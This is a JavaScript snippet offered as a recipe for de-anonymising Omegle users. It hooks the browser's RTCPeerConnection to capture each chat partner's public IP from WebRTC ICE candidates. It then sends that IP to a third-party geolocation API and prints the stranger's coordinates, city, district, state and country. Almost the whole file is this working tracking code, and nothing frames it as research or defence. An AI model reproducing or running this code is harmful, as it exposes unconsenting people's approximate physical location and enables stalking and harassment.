// Retrieve "stranger's" location on Omegle
// ----------------------------------------
// This is a pure Javascript recipe for fetching location of "strangers" on Omegle.
// The below recipe does the bare minimum to get the job done, you can use dedicated WebRTC
// libraries for JS (for example: PeerJS) to enhance the inner workings of the recipe.

// NOTE:
// -----
// Before getting started, please ensure you create and account at https://ipgeolocation.io/
// This is a free IP Geolocation API service which provides you with the metadata with respect
// to the corresponding IP location. Also the service does't requires you to put in your
// credit card details. You can use any IP geolocation tool for that matter, but this stood
// first in my Google search.

// API key registeration:
// ----------------------
let apiKey = "ADD YOUR API KEY HERE"

// Inner logic to fetch the IP address of the stranger:
// ----------------------------------------------------
// The inner logic is simple, we fetch the IceCandidate object from the event.
// This IceCandidate object provides multiple candidates, we need to pick one
// which is neeeded and parse the contents of it. The fields object represents the
// parsed content.
window.originalRTCPeerConnection = window.originalRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function(...args) {
    const user = new window.originalRTCPeerConnection(...args);
    user.originalAddIceCandidate = user.addIceCandidate;
    user.addIceCandidate = function(iceCandidate, ...other) {
        const fields = iceCandidate.candidate.split(" ");
        const ipAddress = fields[4]; // This is stranger's IP Address
        if (fields[7] === "srflx") {
            retrieveLocation(ipAddress);
        }
        return user.originalAddIceCandidate(iceCandidate, ...other);
    };
    return user;
};

// Wrapper function to convert IP address to readable metadata
// -----------------------------------------------------------
// This snippet is self-explanatory...
let retrieveLocation = async(ipAddress) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ipAddress}`;
    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `
Stranger's details:
-------------------
Latitude / Longitude : (${json.latitude}, ${json.longitude})
City                 : ${json.city}
District             : ${json.district}
State                : ${json.state_prov}
Country              : ${json.country_name}`;
            console.log(output);
        })
    );
};
